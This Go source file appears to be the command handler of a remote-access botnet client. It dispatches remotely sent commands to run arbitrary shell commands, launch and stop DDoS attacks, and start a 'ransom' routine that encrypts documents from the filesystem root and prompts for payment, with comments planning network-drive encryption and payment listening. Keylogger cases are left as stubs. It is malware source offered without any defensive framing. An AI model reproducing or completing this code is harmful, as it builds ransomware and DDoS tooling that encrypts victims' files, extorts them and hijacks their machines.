package main

func Execute(command string, target string, args string) {
	if target == "*" || target == GetUsername() {
		switch command {
		case "cmd":
			Run(args)
		case "off":
		case "lo":
		case "kill":
		case "msg":
		case "web":
		case "ddos":
			DdosApi(100, args)
		case "sdd":
			StopDdos()
		case "pass":
		case "upgrade":

		case "uninstall":

		case "start-keylogger":

		case "keylog":
			//Send("res", KeyLogs)
		case "ransom":
			EncryptDocumets("/", true)
			//Encrypt net drives

			// Once encrypted
			//WriteRegDone()
			// Write done to pastebin
			PromtPay()

			//ListenForPayment()

		default:
			Send("res", "Not a command")
		}
	}
}
